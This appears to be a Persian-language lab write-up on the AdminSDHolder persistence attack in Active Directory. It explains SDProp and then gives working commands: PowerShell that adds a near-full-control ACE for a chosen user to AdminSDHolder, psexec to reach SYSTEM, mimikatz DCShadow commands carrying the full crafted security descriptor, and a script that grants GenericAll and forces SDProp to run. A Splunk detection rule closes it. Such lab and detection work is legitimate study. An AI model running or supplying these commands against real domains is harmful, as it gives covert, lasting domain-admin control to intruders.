
خب بریم برای یک تکنیک پیشرفته جذاب به اسم AdminSDHolder 


AdminSDHolder چیست

یک Container در Active Directory است که به‌عنوان الگوی (template) امنیتی برای Protected Objects استفاده می‌شود.

مسیرش:

CN=AdminSDHolder,CN=System,DC=domain,DC=local

این Container شامل Security Descriptor (به‌خصوص DACL) مرجع است.

اشیای حساس مانند:

- Domain Admins
    
- Enterprise Admins
    
- Schema Admins
    
- Administrators
    
- Domain Controllers
    
- و سایر گروه‌ها/اکانت‌های Protected
    

به‌صورت دوره‌ای با این الگو همگام‌سازی می‌شوند


![[3.png]]

![[4.png]]

اگر به بخش Security بریم می بینیم که هردو attribute که دارن یکیه 

مکانیزم واقعی این است:

- یک کاربر یا گروه به هر دلیلی Protected می‌شود (مثلاً عضو Domain Admins است).
    
- سرویس SDProp روی Domain Controller اجرا می‌شود (به‌طور پیش‌فرض حدود هر 60 دقیقه).
    
- SDProp، DACL موجود روی AdminSDHolder را می‌خواند.
    
- همان DACL را روی تمام Protected Objects اعمال می‌کند.
    
- هم‌زمان ACL inheritance را روی آن Objectها غیرفعال می‌کند و Attribute `adminCount=1` را تنظیم می‌کند.


### چرا مایکروسافت این مکانیزم را ساخته؟

فرض کن یک Administrator عضو Domain Admins است.

یک مهاجم یا حتی یک Admin اشتباه می‌آید و روی آن User این Permission را اعمال می‌کند:

```
Everyone -> Full Control
```

یا

```
HelpDesk -> Reset Password
```

این تغییر می‌تواند امنیت دامین را نابود کند.

SDProp
هر یک ساعت ACL را از AdminSDHolder کپی می‌کند و تنظیمات ناخواسته را حذف می‌کند.




اما به صورت خلاصه AdminSDHolder یک Container ویژه در Active Directory است که به عنوان الگوی امنیتی (Security Template) برای اکانت‌ها و گروه‌های Privileged عمل می‌کند. سرویس SDProp روی Domain Controller به صورت دوره‌ای ACL های موجود در AdminSDHolder را بر روی تمامی Object های محافظت‌شده اعمال می‌کند. به همین دلیل هرگونه تغییر مستقیم در Permission های این Object ها معمولاً توسط SDProp بازنویسی می‌شود. مهاجمان می‌توانند با دستکاری ACL های AdminSDHolder و اعطای مجوزهای مخرب به یک حساب تحت کنترل خود، دسترسی ماندگار (Persistence) در سطح دامین ایجاد کنند که به حمله AdminSDHolder Persistence معروف است.

#### SDProp ----> Securtiy Descriptor Por Packator


![[1.png]]



![[2.png]]



![[Pasted image 20260722045422.png]]



تو این مسیر ریجستری باید یه value بسازیم و بازه زمانی که این پروسه اجرا میشه رو تغییر بدیم 

![[Pasted image 20260722045538.png]]


اگر بخواهیم force کنیم میتونیم با استفاده از ldp هم بیایم و اینکار رو بکنیم 

![[Pasted image 20260722045723.png]]


![[Pasted image 20260722045749.png]]

بعد باید modify کنیم یه Attribute به اسم fixupinheritance

![[Pasted image 20260722050213.png]]


### Attack 

حالا تو مرحله بعدی ما با سطح دسترسی Domain Admin که روی DC داریم میخواهیم حمله DCSHADOW رو بزنیم 
اگر یادتون باشه ما حمله dcshadow میومدیم object ها و attribute هایی که داخل DC هستن رو تغییر میدادیم 
حالا میخواهیم بیایم و تو این مرحله با استفاده از حمله DCshadow بیایم و این کانتینر رو تغییر بدیم 

حالا ما میخواهیم بریم  یه user از طریق حمله DCshadow وارد کانتینر AdminSDHolder بکنیم 


چرا میخوام اینکارو بکنم به این خاطر که بعد از اون بازه یی که سرویس SdProp اجرا میشه user میره داخل تمامه protected group ها 


![[Pasted image 20260722051426.png]]

adsi.msc

# Demo

[[SDDL --- Security Descriptor Definition Language]]


خب بریم باهم دیگه object target رو وارد این کانتینر کنیم 

```powershell
$AdminSDHolder = [adsi]"LDAP://CN=AdminSDHolder,CN=System,DC=thlab,DC=local"

$SDDL = $AdminSDHolder.ObjectSecurity.Sddl
```

حالا تو مرحله بعد میریم و این ACL هاش رو داخل یه متغیر به اسم SDDL ذخیره میکنیم 


```powershell
$UserToAdd = [adsi]"LDAP://CN=target,OU=thlab,DC=thlab,DC=local"
```

فرمت ADSI به این معنا هست که به صورت  **Distinguished Names**  باشه 


```powershell
$UserSid = New-Object System.Security.Principal.SecurityIdentifier($UserToAdd.objectSid[0],0)

$NewSDDL = $SDDL + "(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + $UserSid.Value + ")"
```

این ACE در واقع مجوزهای بسیار زیادی (تقریباً Full Control روی شیء) به SID موردنظر اضافه می‌کند.


![[5.png]]

![[Pasted image 20260722054531.png]]

تو اولی اومدم اون ACL که مد نظرم بودش رو اضافه کردم به user که میخواستم 


حالا بریم تو مرحله بعد به واسطه حمله DCsahdow  اون object به همراه attribute که ساختیم بهش  بدیم 

##### نکته : ( اگر یادتون باشه ما حمله dcshadow رو فقط با سطح دسترسی SYSTEM میزنیم )
برای اینکه بخواهیم سطح دسترسی مون رو به SYSTEM برسونیم میتونیم ابزار هایی ماننده psexec برسونیم 
یا اگر بخواهیم سطح دسترسی مون رو بالا تر ببریم و به TrustedInstaller برسونیم میتونیم از این ابزار هم که متعلق به خودم هست هم بیایم و استفاده کنیم 

```
psexec -i -s -d powershell.exe
```

https://github.com/GOP963/-TrustedInstaller-Token-Research


بعد از اینکه سطح دسترسی مون رو به SYSTEM رسوندیم و یه powershell با توکن SYSTEM گرفتیم حالا نوبت به این می رسه که بیایم و این حمله رو بزنیم 

![[Pasted image 20260722055415.png]]

![[6.png]]

![[7.png]]


```powershell
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=thlab,DC=local /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;DA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-3979898382-3728772756-2882759660-519)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;WD)(OA;CI;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;PS)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;RPWP;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;RPWP;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3979898382-3728772756-2882759660-1113)
```


قسمت value میشه اون SDDL جدیدی که ساختیم 

![[Pasted image 20260722060614.png]]

وقتی که start میکنیم RPC Server راه اندازی میشه و باید  بریم یه mimikatz دیگه باز کنیم و این مقادیر رو داخلش push کنیم 

```powershell
lsadump::dcshadow /push
```

![[Screen Recording 2026-07-22 061040.mp4]]


خطاها در مرحله **Unregistration** رخ داده‌اند  یعنی sync موفق بوده، ولی mimikatz نتوانسته DC جعلی را از Active Directory پاک کند.

- `ldap_delete_s ... 0x35 (53)`  کد `53` یعنی `LDAP_UNWILLING_TO_PERFORM`: سرور DC اصلی حاضر نیست آن آبجکت‌های LDAP را حذف کند. معمولاً به دلیل:
    
    - نداشتن permission کافی برای حذف آبجکت‌های زیر `CN=Sites,CN=Configuration`
    - محافظت از حذف تصادفی (Accidental Deletion Protection) روی آن آبجکت‌ها فعال است
- `ldap_modify_s computer SPN 0x10 (16)`  کد `16` یعنی `LDAP_NO_SUCH_ATTRIBUTE`: تلاش برای حذف یک SPN که از قبل وجود ندارد یا قبلاً پاک شده.
**نتیجه عملی:**

Sync انجام شده (`Sync Done`) — یعنی تغییرات به DC اصلی push شدند. مشکل فقط در cleanup است. آبجکت‌های ثبت‌شده زیر `CN=Configuration` ممکن است در AD باقی مانده باشند و باید دستی پاک شوند:


![[Pasted image 20260722081755.png]]


---
---

بریم تو مرحله بعدی یه اسکریپت PowerShell باهم بنویسم که بتونیم از طریق این همین فرایند Attack رو Automation کنیم اما نه  با dcshadow 


### AdminSDHolder Script

```powershell
$adminSDHolder = [ADSI]"LDAP://CN=AdminSDHolder,CN=System,DC=THLab,DC=local"

$attacker = New-Object System.Security.Principal.NTAccount("THLab", "martin")
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $attacker,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow
)

$adminSDHolder.psbase.ObjectSecurity.AddAccessRule($rule)
$adminSDHolder.psbase.CommitChanges()

### Force 
$rootDSE = [ADSI]"LDAP://RootDSE"
$rootDSE.Put("runProtectAdminGroupsTask", "1")
$rootDSE.SetInfo()

```

![[Pasted image 20260722082205.png]]


#### Refenrece 

[ired.team] ---> https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence


# Detection

خب ما رفتیم یه contriner  رو change کردیم پس باید دنبال  EventCode 5136 باشیم 


![[Pasted image 20260725031211.png]]

#### SPL Rule
```spl
index=windows EventCode=5136
| rex field=_raw "Account Name:\s+(?<User>[^\r\n]+)"
| rex field=_raw "DN:\s+(?<ObjectDN>[^\r\n]+)"
| rex field=_raw "LDAP Display Name:\s+(?<Attribute>[^\r\n]+)"
| rex field=_raw "Type:\s+(?<Operation>[^\r\n]+)"
| search ObjectDN="*CN=AdminSDHolder*"
| search Attribute="nTSecurityDescriptor"
| eval Severity="Critical"
| eval MITRE="T1098"
| eval Technique="AdminSDHolder ACL Modification"
| table _time User Severity Technique MITRE Operation ObjectDN
```


